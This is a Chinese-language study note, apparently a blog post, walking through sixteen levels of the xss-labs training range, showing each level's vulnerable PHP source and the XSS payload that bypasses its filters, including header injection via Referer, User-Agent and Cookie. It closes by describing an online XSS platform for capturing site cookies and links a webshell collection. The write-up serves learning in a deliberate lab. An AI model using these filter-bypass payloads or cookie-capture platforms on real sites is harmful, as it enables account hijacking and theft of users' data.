---
title: "网安笔记 - web漏洞 - XSS跨站攻击 - XSS跨站订单反杀"
category: "网安笔记"
date: 2026-04-07
published: 2026-04-07
author: "Rin"
---

[https://xss8.cc/](https://xss8.cc/)

[https://www.postman.com/downloads/](https://xss8.cc/)

[https://github.com/tennc/webshell](https://github.com/tennc/webshell)

[https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw](https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw) 提取码xiao

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628132918301-6d92440b-aa98-4275-a9bf-b7f7658b568a.png)

### xss-labs靶场搭建

通关手册：[https://blog.csdn.net/wo41ge/article/details/107459332](https://blog.csdn.net/wo41ge/article/details/107459332)

[https://blog.csdn.net/weixin_43669045/article/details/107932942](https://blog.csdn.net/weixin_43669045/article/details/107932942)

靶场项目地址：[https://codeload.github.com/do0dl3/xss-labs/zip/refs/heads/master](https://codeload.github.com/do0dl3/xss-labs/zip/refs/heads/master)

#### level1

```
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()
{
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test";
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<?php
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628236533914-869040d5-7a51-464f-a01f-6053c045aff4.png)

在上面的代码中可以看到传入参数`name`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628236665626-a1759abc-9055-4566-ab31-35609776ff65.png)

将传入的参数替换为js代码执行

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628236759215-0d7c96a3-4322-4fe6-b57a-71b85bec9ce6.png)

#### level2

```
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()
{
confirm("完成的不错！");
 window.location.href="level3.php?writing=wait";
}
</script>
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
<center><img src=level2.png></center>
<?php
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

因为内容被嵌套在表单中的value属性内`<input type=submit name=submit value="搜索"/>` 所以需要先闭合input标签，`">把前面的input标签闭合`，然后在注入代码，闭合标签。最终构成以下代码

123"><script>alert(1)</script>![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628238532121-78ea042a-dd7f-4382-bee7-588d0443628a.png)

#### level3

```
<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
<center><img src=level3.png></center>
<?php
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

后端利用htmlspecialchars()函数会将特殊字符进行转义，这里无法采用标签，因为标签都是带有”<"的。但该函数不会转义单引号，可以采用事件闭合标签.

playload： ' onclick='alert(1)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628252103059-8fc552dd-5e9c-4e4b-939e-8acf09ab001d.png)

#### level4

```
<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level4.png></center>
<?php
```

可以看到的是<>都被替换为空，也就没法采用标签闭合的方式 `C`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628252729572-68a7c02a-9484-45c2-bbb9-fa567c77cce7.png)

#### level5

```
<?php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

限制了script和on字符---->替换成scr_pt 和o_n ，使用a标签的js伪协议实现href属性支持javascript:伪协议构造poc 产生一个链接

"> <a href=javascript:alert('xss') > xss</a> //

#### level6

```
<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level6.png></center>
<?php
```

限制了一系列的字符 但进行判断的是整个字符串，但是没有进行大小写绕过。

"><SCRIPT>alert(1)</SCRIPT>

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628255029048-af6ffc0e-b3b3-4c41-bee6-7809c8daf42c.png)

#### level7

```
<?php
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level7.png></center>
<?php
```

限制了一系列的字符 大小写无法绕过，但因为只是替换，可以双写绕过。

"><scscriptript>alert(1)</scrscriptipt>

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628255448738-0db82aab-0c51-4881-8858-922c7cbd9ca1.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628255480700-28f30934-e417-4c0a-971a-b31010e0d30c.png)

#### level8

```
<?php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
```

[https://www.matools.com/code-convert-unicode](https://www.matools.com/code-convert-unicode)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628255888115-18b72b85-f433-4a27-9042-92e03e0c0331.png)

&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628255974475-dd9d290f-a0a3-411b-ad1b-1e16ba4fda6d.png)

#### level9

```
<?php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
<center><img src=level9.png></center>
<?php
```

通关代码`if(false===strpos($str7,'http://'))` 判断是否包含http://然后返回,也就是说这里不能直接使用http://，因此这里要采用编码

&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628306150210-87e6d8c2-43fb-4aff-9429-6b69a367e987.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628306370607-822f2d4f-746d-4e0f-8363-4a41b225a196.png)

#### level10

```
<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level10.png></center>
<?php
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628323347546-033bd86d-26ae-4ccf-9fa4-f3470b4657d2.png)

看到这个就知道是要测试出要提交的是哪一个表单，由于源码中我们已经知道是通过`t_sort`表单提交的数据。

?keyword=<script>alert('xss')</script>&t_sort=" type="text" onclick="alert('xss')

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628323501969-7599959d-1004-4bf5-a8a2-eedba127bd8f.png)

#### level11

```
<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level11.png></center>
<?php
```

这一关卡和上面的一关非常的像多了一个input表单的信息，在服务器端还将请求头中的referer头的值赋给了str11这个变量，$_SERVER['HTTP_REFERER'] #链接到当前页面的前一页面的 URL 地址，也就是说这里可以做点文章。在将变量值中的<和>删除之后就会插入到t_ref这个标签的**value**属性值中。而上一关的t_sort标签虽然也能接收并显示参数值，但是这个参数值是要用htmlspecialchars()函数处理的。

抓包分析

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628385106250-c6680b32-16b6-4a9d-b308-1195c1ca6985.png)

可以看到的是数据包中没得关于refer的信息我们构造一个refer的数据包发送出去

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628385130558-9ad4ea13-39cd-4ad6-8d8e-0e7e1b94f96d.png)

构造payload代码

referer:"type="text" onclick="alert('xss')

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628385335721-cabc4688-d9cf-4d6d-b7e3-eacd83fcd2cf.png)

<input name="t_ref" value=""type="text" onclick="alert('xss')" type="hidden">

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628385545024-815ae267-e0e3-4582-a483-425021b1bfe7.png)

#### level12

```
<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level12.png></center>
<?php
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
```

`用户访问服务器时,利用PHP的超级全局变量$_SERVER数组中字段['HTTP_USER_AGENT'] 获取访问用户的所有信息`通过http头获取user-agent字段的值作为t_ua的value，利用burp抓包，修改http的头部的user-agent字段。

正常抓包执行

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628386319779-739bcf67-b883-4ac7-9d82-ce0653de9900.png)

修改user-agent信息

user-agent: t_sort=2" onclick="alert(1)" type="text"

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628386499896-8cd8b323-8cd9-43b3-8ccd-385d228ee824.png)

<input name="t_ua" value="t_sort=2" onclick="alert(1)" type="text" type="hidden">

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628386616073-6f8f9124-d5e2-43e6-9820-4420ce4752fc.png)

#### level13

```
<?php
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level13.png></center>
<?php
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
```

通过http头获取cookie字段的值作为t_cook的value，利用burp抓包，修改http的头部cookie字段。

正常抓包

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628386956463-cd5529c3-8adc-4857-a551-822d17da1ecd.png)

修改数据包

cookie: user=2" onclick="alert(1)" type="text"

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628387071997-3560a9f8-6b1d-4d95-b5df-a834e6d51450.png)

<input name="t_cook" value="2" onclick="alert(1)" type="text" type="hidden">

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628387178969-2c0ef15f-4b41-48b4-8ae9-495451318c50.png)

#### level14

```
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xss/level15.php?src=1.gif>点我进level15</a></center>
</body>
</html>
```

漏洞描述：修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行测试

#### level15

```
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()
{
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test";
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<?php
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>
```

```
从源码中可以看到的是传递参数src

1、ng-include 指令用于包含外部的 HTML文件。

2、包含的内容将作为指定元素的子节点。

3、ng-include 属性的值可以是一个表达式，返回一个文件名。

4、默认情况下，包含的文件需要包含在同一个域名下。

特别值得注意的几点如下：

1.ng-include,如果单纯指定地址，必须要加引号

2.ng-include,加载外部html，script标签中的内容不执行

3.ng-include,加载外部html中含有style标签样式可以识别

构造函数
?src='level1.php?name=<img src=1 onerror=alert(1)>'
因为这里参数值算是一个地址，所以需要添加引号。

但是level1.php不是一个php文件吗？

这里解释一下

这是因为我们不是单纯的去包含level1.php，而是在后面添加了name参

数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的

html文件给包含进来的意思。
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628387908094-7ae7aa20-416a-46c3-a6a0-b774a8e0ada2.png)

#### level16

```
<?php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("     ","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
<center><img src=level16.png></center>
<?php
echo "<h3 align=center>payload的长度:".strlen($str5)."</h3>";
?>
```

```
将参数值中的script替换成&nbsp;
将参数值中的空格也替换成&nbsp;
将参数值中的/符号替换成&nbsp;

绕过思路：可以用回车来将它们分开。
<img%0Asrc=1%0Aonerror=alert(1)>
```

<img%0Asrc=1%0Aonerror=alert(1)>

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628388814060-cf652368-6434-4364-a176-50b381f3b892.png)

### jfdd靶场

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628393088042-a6672ea1-9aab-47b0-ac11-f793c123426f.png)![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628393102575-c6ec0c04-8ce6-4d65-a2e6-1126c39f3f9f.png)

注册xss平台账号，当然也可以自己搭建[https://xss8.cc/register/](https://xss8.cc/register/),这样的在线网站可以帮我们接受网站的cookie，也就是说我们可以通过在线的xss平台作为第三方工具盗取网站信息，同时也存在一些问题就是我们的渗透测试的过程当中我们获取的网站信息有可能会被这些平台白嫖，还有就是我们在网上下载的xss(或者是其他工具)很有可能是带后门的。

由于上面的靶场，各种各样的问题导致环境根本无法运行起来，我也没找到合适的替代靶场只有先截图和文字记录。